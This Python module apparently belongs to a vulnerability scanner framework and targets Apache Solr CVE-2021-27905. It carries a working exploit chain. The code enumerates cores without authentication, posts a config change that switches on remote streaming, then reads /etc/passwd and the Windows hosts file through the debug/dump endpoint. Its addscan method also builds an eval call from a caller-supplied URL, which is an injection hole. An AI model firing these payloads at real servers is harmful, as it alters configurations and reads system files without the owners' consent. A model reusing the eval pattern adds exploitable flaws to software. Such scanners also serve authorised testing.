#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheSolr扫描类: 
        Solr SSRF/任意文件读取
            CVE-2021-27905
file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
import re

class Solr():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheSolr'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2021_27905_payloads = [
            {
                'path': 'solr/admin/cores?indexInfo=false&wt=json',
                'data': ''
            },
            {
                'path': 'solr/{}/config',
                'data': '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///etc/passwd'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
            },
            {
                'path': 'admin/cores?indexInfo=false&wt=json',
                'data': ''
            },
            {
                'path': '{}/config',
                'data': '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
            },
            {
                'path': '{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///etc/passwd'
            },
            {
                'path': '{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'
            },
            {
                'path': '{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
            }
        ]

    def cve_2021_27905_scan(self, url):
        ''' 当Solr不启用身份验证时, 攻击者可以直接制造请求以启用特定配置, 最终导致SSRF或任意文件读取 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CVE-2021-27905'
        vul_info['vul_method'] = 'GET/POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }
        self.db_name = ''                               # * solr数据库名称
        self.RemoteStreaming = False                    # * 是否开启了RemoteStreaming功能

        headers = self.headers.copy()
        headers.update(vul_info['headers'])             # * 合并Headers

        for payload in self.cve_2021_27905_payloads:    # * Payload
            path = payload['path'].format(self.db_name) # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                if self.RemoteStreaming:                # * 如果成功启用了RemoteStreaming功能, 尝试SSRF
                    res = requests.post(
                            target, 
                            timeout=self.timeout, 
                            headers=self.headers, 
                            data=data, 
                            proxies=self.proxies, 
                            verify=False,
                            allow_redirects=False
                        )
                elif self.db_name:                      # * 如果成功获取了solr的数据库名称, 尝试开启目标的RemoteStreaming功能
                    res = requests.post(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,                # * 使用特殊headers
                        data=data, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    if (res.status_code == 200):
                        self.RemoteStreaming = True     # * 成功启用RemoteStreaming功能
                else:
                    res = requests.get(
                        target, 
                        timeout=self.timeout, 
                        headers=self.headers, 
                        data=data, 
                        proxies=self.proxies, 
                        verify=False
                    )
                    db_name = re.search(r'"name":".+"', res.text, re.M|re.I)         # * 如果存在solr的数据库名称
                    if db_name:
                        db_name = db_name.group()
                        db_name = db_name.replace('"name":', '')
                        self.db_name = db_name.strip('"')                            # * 只保留双引号内的数据库名称

                logger.logging(vul_info, res.status_code, res)                       # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text) or ('Microsoft Corp' in res.text) or ('Microsoft TCP/IP for Windows' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Data': data
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_27905_scan, url=url)
        ]

solr = Solr()